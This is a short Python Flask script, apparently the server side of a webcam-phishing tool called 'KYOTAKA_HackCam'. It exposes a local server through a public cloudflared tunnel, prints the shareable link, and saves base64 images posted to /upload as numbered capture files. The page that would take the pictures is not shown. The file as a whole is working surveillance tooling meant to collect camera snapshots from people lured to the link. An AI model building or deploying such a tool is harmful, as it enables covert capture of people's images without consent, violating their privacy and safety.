from flask import Flask, render_template, request
import os
import base64
import subprocess
import time
import re

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    number = data['number']
    with open(f'KYOTAKA_HackCam/capture_{number}.jpg', 'wb') as f:
        f.write(base64.b64decode(image_data))
    return 'OK'

def start_cloudflared(port):
    try:
        print("🚀 Démarrage de cloudflared...")
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )

        # Attendre que le lien apparaisse
        while True:
            line = process.stdout.readline().decode()
            if "trycloudflare.com" in line:
                url_match = re.search(r'(https://.*\.trycloudflare\.com)', line)
                if url_match:
                    print(f"🌐 Lien public : {url_match.group(1)}")
                    break
            if line == '' and process.poll() is not None:
                break
    except Exception as e:
        print(f"❌ Erreur lors du démarrage de cloudflared : {e}")

if __name__ == '__main__':
    os.makedirs('KYOTAKA_HackCam', exist_ok=True)

    port = 5000
    print(f"📡 Serveur local lancé sur le port {port}")
    time.sleep(1)

    # Lancer cloudflared en arrière-plan
    start_cloudflared(port)

    # Démarrer Flask
    app.run(port=port)